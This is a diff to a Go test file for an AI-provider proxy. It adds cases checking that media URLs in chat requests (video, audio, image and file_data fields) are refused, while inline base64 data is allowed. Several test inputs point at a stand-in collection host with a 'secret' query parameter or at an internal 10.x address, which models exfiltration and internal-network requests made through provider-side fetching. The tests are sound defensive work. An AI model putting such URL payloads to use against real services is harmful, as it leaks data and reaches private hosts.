@@ -144,6 +144,15 @@ var injectCorpus = []injectCase{
 	{"chat-image-url", "openai", "POST", "/v1/chat/completions", nil, `{"messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":"https://collect.example/c.png"}}]}]}`, "policy_field"},
 	{"chat-image-data", "openai", "POST", "/v1/chat/completions", nil, `{"messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":"DATA:image/png;base64,iVBORw0KGgo="}}]}]}`, ""},
 	{"custom-image-url-string", "custom", "POST", "/chat/completions", nil, `{"messages":[{"role":"user","content":[{"type":"image_url","image_url":"https://collect.example/s.png"}]}]}`, "policy_field"},
+	// the same for the media other compatible services fetch: video_url and audio_url (with or without a
+	// type naming them), and a file whose file_data is a URL
+	{"custom-video-url", "custom", "POST", "/chat/completions", nil, `{"messages":[{"role":"user","content":[{"type":"video_url","video_url":{"url":"https://collect.example/v.mp4?d=secret"}}]}]}`, "policy_field"},
+	{"custom-audio-url-untyped", "custom", "POST", "/chat/completions", nil, `{"messages":[{"role":"user","content":[{"audio_url":{"url":"http://10.0.0.8/a.wav"}}]}]}`, "policy_field"},
+	{"custom-image-url-untyped", "custom", "POST", "/chat/completions", nil, `{"messages":[{"role":"user","content":[{"type":"text","text":"x","image_url":"https://collect.example/t.png"}]}]}`, "policy_field"},
+	{"openrouter-file-data-url", "openrouter", "POST", "/chat/completions", nil, `{"messages":[{"role":"user","content":[{"type":"file","file":{"filename":"p.pdf","file_data":"https://collect.example/p.pdf"}}]}]}`, "policy_field"},
+	{"openrouter-file-data-inline", "openrouter", "POST", "/chat/completions", nil, `{"messages":[{"role":"user","content":[{"type":"file","file":{"filename":"p.pdf","file_data":"data:application/pdf;base64,JVBERi0xLjQK"}}]}]}`, ""},
+	{"chat-file-data-base64", "openai", "POST", "/v1/chat/completions", nil, `{"messages":[{"role":"user","content":[{"type":"file","file":{"filename":"p.pdf","file_data":"JVBERi0xLjQK"}}]}]}`, ""},
+	{"custom-video-data", "custom", "POST", "/chat/completions", nil, `{"messages":[{"role":"user","content":[{"type":"video_url","video_url":{"url":"data:video/mp4;base64,AAAA"}}]}]}`, ""},
 }
 
 // upstreamForCase is the upstream a case runs against, at base (the custom ones at base/v1, openrouter
@@ -278,6 +287,12 @@ func TestInjectBodyPolicy(t *testing.T) {
 		{oai, routeChat, `{"messages":[{"content":[{"type":"image_url","image_url":{"url":"data:image/png;base64,AA=="}}]}]}`,
 			`{"max_completion_tokens":8192,"messages":[{"content":[{"image_url":{"url":"data:image/png;base64,AA=="},"type":"image_url"}]}],"model":"gpt-5-nano","store":false}`},
 		{cus, routeChat, `{"messages":[{"content":[{"type":"image_url","image_url":"https://u"}]}]}`, "refused:policy_field:messages[0].content[0].image_url"},
+		{cus, routeChat, `{"messages":[{"content":[{"type":"video_url","video_url":{"url":"https://u/v.mp4"}}]}]}`, "refused:policy_field:messages[0].content[0].video_url"},
+		{cus, routeChat, `{"messages":[{"content":[{"audio_url":{"url":"http://u/a.wav"}}]}]}`, "refused:policy_field:messages[0].content[0].audio_url"},
+		{cus, routeChat, `{"messages":[{"content":[{"type":"text","text":"x","image_url":{"url":"https://u"}}]}]}`, "refused:policy_field:messages[0].content[0].image_url"},
+		{oai, routeChat, `{"messages":[{"content":[{"type":"file","file":{"file_data":"https://u/f.pdf"}}]}]}`, "refused:policy_field:messages[0].content[0].file.file_data"},
+		{oai, routeChat, `{"messages":[{"content":[{"type":"file","file":{"file_data":"JVBERi0xLjQK"}}]}]}`,
+			`{"max_completion_tokens":8192,"messages":[{"content":[{"file":{"file_data":"JVBERi0xLjQK"},"type":"file"}]}],"model":"gpt-5-nano","store":false}`},
 	} {
 		out, ref := rewriteInjectBody(tc.up, tc.kind, []byte(tc.in))
 		got := string(out)
